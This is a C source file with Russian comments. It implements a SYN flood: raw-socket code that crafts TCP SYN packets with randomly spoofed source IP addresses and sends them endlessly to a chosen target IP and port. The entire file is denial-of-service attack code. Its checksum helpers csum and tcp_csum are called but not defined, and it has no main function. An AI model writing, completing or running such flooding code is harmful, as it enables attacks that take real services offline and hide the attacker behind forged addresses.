#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define PACKET_LEN 4096

void send_syn_flood(const char *target_ip, int target_port) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s < 0) {
        perror("socket");
        exit(1);
    }
    
    char packet[PACKET_LEN];
    memset(packet, 0, PACKET_LEN);
    
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    // Заполнение IP-заголовка
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->daddr = inet_addr(target_ip);
    
    // Заполнение TCP-заголовка
    tcph->source = htons(rand() % 65535);
    tcph->dest = htons(target_port);
    tcph->seq = htonl(rand() % 4294967295);
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    while(1) {
        // Генерируем случайный подменяемый IP
        iph->saddr = htonl(rand() % 4294967295);
        
        // Пересчитываем контрольные суммы
        iph->check = 0;
        iph->check = csum((unsigned short *)packet, iph->tot_len >> 1);
        
        tcph->check = 0;
        tcph->check = tcp_csum(iph, tcph);
        
        // Отправляем пакет
        if(sendto(s, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("sendto");
        }
    }
    
    close(s);
}